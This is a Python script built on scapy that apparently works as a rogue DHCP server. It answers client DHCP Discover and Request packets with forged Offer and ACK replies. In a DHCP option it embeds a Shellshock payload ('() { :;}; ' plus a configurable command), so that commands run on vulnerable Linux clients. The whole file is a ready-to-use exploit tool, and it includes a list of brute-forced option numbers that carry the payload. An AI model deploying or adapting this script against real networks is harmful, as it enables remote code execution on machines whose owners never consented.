#! /usr/bin/env python
from scapy.all import *
from struct import *
import sys, os, time
import argparse 
from functools import partial
import re
from scapy.layers.dhcp import dhcp_request
 
#
# TODO:
# - Support ipv6
# - Support ~/16 notation for subnet masks
# - if --static-data is given and no --gateway detect the own currently used by this machine
#
 
 
def regex_validator(regex, value):
    d = re.search(regex, value)
    if d is None:
        raise argparse.ArgumentTypeError("Argument must match '%s'" % getattr(regex, "pattern", str(regex)) )
    return d.group()

# yeah, i know its a long line for python, but i am not gonna wrap an regex
mac_validator = partial(regex_validator, re.compile('^[0-9a-f]{1,2}[-:]?[0-9a-f]{1,2}[-:]?[0-9a-f]{1,2}[-:]?[0-9a-f]{1,2}[-:]?[0-9a-f]{1,2}[-:]?[0-9a-f]{1,2}$', re.I))
ip_validator = partial(regex_validator, re.compile('^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$', re.I))
      
 
def toMAC(strMac):
    cmList = strMac.split(":")
    hCMList = []
    for iter1 in cmList:
        hCMList.append(int(iter1, 16))
    hMAC = struct.pack('!B', hCMList[0]) + struct.pack('!B', hCMList[1]) + struct.pack('!B', hCMList[2]) + struct.pack('!B', hCMList[3]) + struct.pack('!B', hCMList[4]) + struct.pack('!B', hCMList[5]) 
    return hMAC

# yeah i know it is not nice, but it oes work, so...
fill = lambda v, n, f: f*(max(n-len(v), 0)) + v
def get_CIDR(netmask):
    d =  "".join(fill(bin(int(x))[2:], 8, "0") for x in netmask.split(".")).find("0")
    if d == -1:
        return 0 # why the fuck would you do this ?
    return d

 
def detect_dhcp(pkt):
    #if not pkt[Ether].src.lower() == victim_mac.lower():
    #        return    
    try:
        dhcpPkt = pkt[DHCP]
    except:
        return
    if not pkt[DHCP] or pkt[DHCP].options[0][1] not in (1, 3): return
    if params.whitelist and pkt[Ether].src not in params.whitelist: return
    if params.blacklist and pkt[Ether].src in params.blacklist: return
    
    clientMAC = pkt[Ether].src
    #If DHCP Discover then DHCP Offer
    if pkt[DHCP].options[0][1] == 1:
        tmp = dict(dhcp_settings)
        tmp['message-type'] = 'offer'
        options = list(tmp.items())
        options.append("end")
        ip = ip_generator()
        if pkt[IP].dst == "255.255.255.255":
            smac = my_mac
            sip = my_ip
        else:
            smac = pkt[Ether].dst
            sip = pkt[IP].dst 
        
        send_bogus_package(clientMAC, smac, ip, sip, pkt[BOOTP].xid, dhcp_options=options)
        # just to increase the chances...
        #send_bogus_package(clientMAC, ip, pkt[BOOTP].xid, dhcp_options=options, response_type="ack", count=5)
        print "DHCP Recover packet detected from " + clientMAC, (pkt[IP].src if IP in pkt else "-")
        print "-> to", pkt[Ether].dst, (pkt[IP].dst if IP in pkt else "-")
    # Request response
    else:
        # we just ACK every client REQUEST
        tmp = dict(dhcp_settings)
        for k, v in ( x for x in pkt[DHCP] if isinstance(x, tuple) and x[0] in ('requested_addr', 'hostname') ):
            tmp[k] = v
        tmp['message-type'] = 'ack'
        options = list(tmp.items())
        options.append("end")
        if pkt[IP].dst == "255.255.255.255":
            smac = my_mac
            sip = my_ip
        else:
            smac = pkt[Ether].dst
            sip = pkt[IP].dst
        if pkt[BOOTP].ciaddr == "0.0.0.0": ip = ip_generator()
        else: ip = pkt[BOOTP].ciaddr
        print "->", clientMAC, smac, ip, sip, pkt[BOOTP].xid, options
        send_bogus_package(clientMAC, smac, ip, sip, pkt[BOOTP].xid, options, count=5)

        print "DHCP Request packet detected from " + clientMAC, (pkt[IP].src if IP in pkt else "-")
        print "-> to", pkt[Ether].dst, (pkt[IP].dst if IP in pkt else "-")


def send_bogus_package(clientMAC, sender_mac, assign_ip, my_ip, xid, dhcp_options, count=1):
    sendp(
        Ether(src=sender_mac, dst="ff:ff:ff:ff:ff:ff")/
        IP(src=my_ip, dst="255.255.255.255")/
        UDP(sport=67,dport=68)/
        BOOTP(
        op=2,
            yiaddr=assign_ip,
            siaddr=dhcp_settings['server_id'],
            giaddr=dhcp_settings['router'],
            chaddr=toMAC(clientMAC),
            xid=xid
        )/
        DHCP(options=dhcp_options), count=count)



if __name__ == '__main__':
    """
    Some bruteforced option fields which seem to "accept" strings and get into env vars.
    TODO: check what each option is  
    114    validated    (required changes to /etc/dhcp/dhclient.conf to work on my system)
    242    validated
    80    validated
    133
    137
    83
    195
    250
    224
    108
    163
    174    
    """
    
    global params, ack_header, dhcp_settings, ip_generator, my_mac, my_ip
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', type=mac_validator, help="Use the given interface for sniffing and sending.")
    parser.add_argument('-b', '--blacklist', metavar="MAC", nargs="+", type=mac_validator, default=None, help="Never react to package from given MAC.")
    parser.add_argument('-w', '--whitelist', metavar="MAC", nargs="+", type=mac_validator, default=None, help="Only react to packages from given MAC.")
    
    parser.add_argument('-s', '--static-data', action="store_true", help="If given no dhcp request is done to get the settings. If used --gateway, --dns-server and --subnet-mask should be supplied.")
    parser.add_argument('--ip', type=ip_validator, help="If given send this IP to the client(s) on DISCOVER.")
    parser.add_argument('--dns-server', type=ip_validator, help="If given send this DNS server IP to the client(s) on DISCOVER and REQUEST.")
    parser.add_argument('--gateway', type=ip_validator, help="If given send this gateway IP to the client(s) on DISCOVER and REQUEST.")
    parser.add_argument('--subnet-mask', type=ip_validator, help="If given send this subnet mask to the client(s) on DISCOVER and REQUEST.")
    parser.add_argument('--mac', type=mac_validator, help="Use the given MAC address if not supplied by client. If not given we use the mac from the real server, or a random random one (if --static-data is given)..", default=None)
    parser.add_argument('--server-ip', type=ip_validator, help="Use the given IP address if not supplied by client. If not given we use the IP from the real server, or a random random one (if --static-data is given)..", default=None)

    parser.add_argument('-l', '--lease', type=int, help="Lease time to use.", default=30)
    parser.add_argument('-c', '--command', help="The command to execute on the client machine.", default="/usr/bin/id > /tmp/test_x")
    parser.add_argument('-o', '--option', type=int, help="The option flag to use for the payload.", default=114)
    
    params = parser.parse_args()
    conf.checkIPaddr = False    
    
    if not params.static_data:
        foo = dhcp_request(params.interface, nofilter=1)
        dhcp_settings = dict( x for x in foo[DHCP].fields['options'] if isinstance(x, tuple) ) 
        print "got dhcp settings:", dhcp_settings
        if params.server_ip is None: my_ip = foo[IP].src
        else: my_ip = params.server_ip
        if params.mac is None: my_mac = foo[Ether].src
        else: my_mac = params.mac
    else:
        if not (params.subnet_mask and params.gateway):
            print "If --static_data is given you need to supply at least --gateway and --subnet_mask"
            exit(1)
        dhcp_settings = dict()
        if params.server_ip is None: my_ip = RandIP(params.gateway+"/"+str(get_CIDR(params.subnet_mask)))
        else: my_ip = params.server_ip
        if params.mac is None: my_mac = RandMAC()
        else: my_mac = params.mac
        dhcp_settings['server_id'] = my_ip
    if params.dns_server is not None: dhcp_settings['name_server'] = params.dns_server
    if params.subnet_mask is not None: dhcp_settings['subnet_mask'] = params.subnet_mask
    if params.gateway is not None: dhcp_settings['router'] = params.gateway
    dhcp_settings[params.option] = "() { :;}; " + params.command
    dhcp_settings['lease_time'] = params.lease
    dhcp_settings['renewal_time'] = params.lease
    subnet_CIDR = get_CIDR(dhcp_settings['subnet_mask'])
    if params.ip: ip_generator = lambda: params.ip
    else: ip_generator = RandIP(dhcp_settings['router']+"/"+str(subnet_CIDR))._fix   
    if params.whitelist is not None: params.whitelist = set(params.whitelist)
    if params.blacklist is not None: params.blacklist = set(params.blacklist)
    
    sniff(filter="arp or (udp and (port 67 or 68))", prn=detect_dhcp, store=0, iface=params.interface)
